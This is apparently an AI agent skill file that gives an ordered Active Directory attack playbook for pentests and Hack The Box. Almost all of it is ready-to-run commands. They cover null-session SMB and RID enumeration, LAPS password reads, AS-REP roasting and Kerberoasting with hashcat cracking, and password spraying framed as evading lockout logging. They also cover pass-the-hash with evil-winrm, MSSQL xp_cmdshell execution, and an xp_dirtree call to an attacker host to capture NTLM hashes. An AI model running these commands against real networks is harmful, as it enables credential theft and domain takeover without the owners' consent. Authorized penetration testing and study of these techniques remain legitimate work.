---
name: ad-recon
description: Enumerate Active Directory services on a Windows target. Use when analyzing nmap/rustscan output, enumerating SMB shares, querying LDAP, running rpcclient, AS-REP roasting, Kerberoasting, password spraying, LAPS, domain trusts, or starting recon on any Windows/AD target.
user-invocable: false
allowed-tools: Read
---

# AD Recon

Follow this order. Check "Already Executed" in context before running anything.

## 1. Port scan
```bash
rustscan -a {IP} --ulimit 5000 -- -sC -sV
nmap -sV -sC -p 53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,9389 {IP}
```
Key ports:
- 88 = Kerberos → Domain Controller
- 389/636/3268/3269 = LDAP/LDAPS/GC
- 445 = SMB
- 5985/5986 = WinRM
- 1433 = MSSQL
- 3389 = RDP
- 53 = DNS (zone transfer attempt)
- 9389 = AD Web Services

## 2. DNS
```bash
dig @{IP} {DOMAIN} ANY
dig @{IP} _ldap._tcp.{DOMAIN} SRV
dnsrecon -d {DOMAIN} -n {IP} -t axfr          # zone transfer
```

## 3. SMB
```bash
netexec smb {IP} -u '' -p '' --shares          # null session
netexec smb {IP} -u 'a' -p '' --shares         # some DCs need any username
netexec smb {IP} -u '{USER}' -p '{PASS}' --shares
netexec smb {IP} -u '' -p '' --rid-brute       # user enum without creds (RID 500-2000)
netexec smb {IP} -u '{USER}' -p '{PASS}' --rid-brute 500-2000
netexec smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus   # crawl all shares
smbclient -L //{IP} -N                         # list shares null
smbclient //{IP}/{SHARE} -N                    # access share null
smbclient //{IP}/{SHARE} -U '{USER}%{PASS}'
```

## 4. LDAP
```bash
# Anonymous bind — check if allowed
ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts
ldapsearch -x -H ldap://{IP} -b 'DC=x,DC=x' '(objectClass=user)' cn sAMAccountName description

# Authenticated
netexec ldap {IP} -u '{USER}' -p '{PASS}' --users
netexec ldap {IP} -u '{USER}' -p '{PASS}' --groups
netexec ldap {IP} -u '{USER}' -p '{PASS}' --password-not-required  # PASSWD_NOTREQD
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M get-desc-users        # all descriptions
ldapdomaindump -u '{DOMAIN}\{USER}' -p '{PASS}' {IP} -o ldap/
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(objectClass=user)' description pwdLastSet badPwdCount

# Pre-Windows 2000 accounts (password = lowercase hostname)
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName

# LAPS
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M laps
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd

# AdminCount=1 (protected users — won't inherit ACL changes from parent)
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(adminCount=1)' sAMAccountName

# Domain trusts
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'CN=System,DC=x,DC=x' '(objectClass=trustedDomain)' name trustDirection
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M enum_trusts
```
**Passwords in description field is the most common credential find in real pentests and HTB.**

## 5. RPC
```bash
rpcclient -U '' -N {IP} -c 'enumdomusers'
rpcclient -U '' -N {IP} -c 'enumdomgroups'
rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomusers;enumdomgroups;querydominfo;lsaenumsid'
rpcclient -U '{USER}%{PASS}' {IP} -c 'querydispinfo'   # user info with descriptions
```

## 6. Kerberos
```bash
# User enumeration (no creds)
kerbrute userenum --dc {IP} -d {DOMAIN} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP roasting (no preauth required)
netexec ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
GetNPUsers.py {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting (SPN accounts)
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
GetUserSPNs.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# Password spraying via Kerberos (avoids LDAP lockout logging)
kerbrute passwordspray --dc {IP} -d {DOMAIN} users.txt '{PASSWORD}'
netexec smb {IP} -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
netexec ldap {IP} -u users.txt -p '{PASS}' --continue-on-success
```

## 7. BloodHound collection
```bash
rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip      # includes ADCS
bloodhound-ce-python -c all -d {DOMAIN} -u '{USER}' -p '{PASS}' -ns {IP} --zip
bloodhound-ce-python -c all -d {DOMAIN} -u '{USER}' -p '{PASS}' -ns {IP} --zip -k  # Kerberos only
# On Windows: SharpHound.exe -c all --zipfilename bh.zip
```

## 8. ADCS
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M adcs
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -stdout         # all templates
```

## 9. WinRM / RDP / MSSQL
```bash
evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}
xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /cert-ignore /dynamic-resolution

mssqlclient.py {DOMAIN}/{USER}:'{PASS}'@{IP} -windows-auth
netexec mssql {IP} -u '{USER}' -p '{PASS}' -x 'whoami'      # xp_cmdshell
netexec mssql {IP} -u '' -p '' -d .                          # guest auth attempt
# MSSQL net-NTLMv2 capture: EXEC xp_dirtree '\\{ATTACKER}\share'
# MSSQL linked servers: SELECT * FROM openquery([LINKED_SRV], 'SELECT 1 AS a')
```

## 10. Web
```bash
feroxbuster -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -fs {SIZE}
# Check IIS default page, Exchange OWA, ADCS web enrollment (/certsrv)
```

## 11. Domain trusts
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M enum_trusts
GetADUsers.py -all {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP}
# BloodHound → Analysis → Find all domain trusts
```

## Clock skew fix (Kerberos needs <5min drift)
```bash
sudo ntpdate {IP}
sudo rdate -n {IP}
faketime "$(rdate -n {IP} 2>&1 | awk '{print $NF}')" bash  # without root
```

## Gotchas
- **Never skip web** — HTTP/HTTPS is often the entry point on Windows boxes
- **LDAP descriptions** — check every user's description; passwords are hidden there constantly
- **Pre-Win2000 accounts** — `userAccountControl:4194304` → password = lowercase machine hostname
- **PASSWD_NOTREQD** — account may have empty password, try it
- **MSSQL guest auth** — try empty creds before assuming auth is needed
- **SMB null auth** — some DCs require a random username (not empty) for null session
- **Protected Users group** — blocks NTLM, RC4, delegation; Kerberos-only, AES required
- **adminCount=1** — these objects don't inherit parent OU ACL changes (AdminSDHolder)
- **Clock skew** — Kerberos fails silently if time diff > 5 minutes; sync first
- **Password spraying** — check lockout policy first: `netexec ldap {IP} -u '{USER}' -p '{PASS}' --pass-pol`

## Key References
- https://www.ired.team
- https://www.thehacker.recipes
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://github.com/ly4k/Certipy/wiki
- https://0xdf.gitlab.io
